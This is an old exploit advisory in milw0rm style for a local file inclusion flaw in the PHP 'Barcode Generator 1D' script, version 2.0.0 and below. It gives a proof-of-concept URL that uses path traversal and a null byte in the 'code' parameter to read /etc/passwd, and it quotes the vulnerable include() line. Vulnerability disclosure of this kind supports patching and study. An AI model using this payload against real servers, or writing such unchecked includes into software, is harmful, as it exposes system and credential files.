@@ -1,0 +1,46 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ###################################################################
+ #  [ barcodegen <= 2.0.0 ]   Local File Inclusion Vulnerability   #
+ ###################################################################
+ #
+ # Script: "Barcode Generator 1D"
+ #
+ # Script site: http://www.barcodephp.com/
+ # Download: http://www.barcodephp.com/download.php
+ #
+ # Vuln: 
+ # http://site.com/[barcodegen.1d-v2.0.0]/html/image.php?t=1&r=1&text=1&f1=1&f2=1&o=1&a1=1&a2=1&code=/../../../../../../../etc/passwd%00
+ #     
+ #
+ # Bug: ./barcodegen.1d-v2.0.0/html/image.php (lines: 2-8)
+ #
+ # ...
+ # if(isset($_GET['code']) && isset($_GET['t']) && isset($_GET['r']) && isset($_GET['text']) && isset($_GET['f1']) 
+ #    && isset($_GET['f2']) && isset($_GET['o']) && isset($_GET['a1']) && isset($_GET['a2'])) {
+ #	require('config.php');
+ #	require($class_dir.'/BCGColor.php');
+ #	require($class_dir.'/BCGBarcode.php');
+ #	require($class_dir.'/BCGDrawing.php');
+ #	require($class_dir.'/BCGFont.php');
+ #	if(include($class_dir . '/BCG' . $_GET['code'] . '.barcode.php')) {	// LFI
+ # ... 			    
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-24]
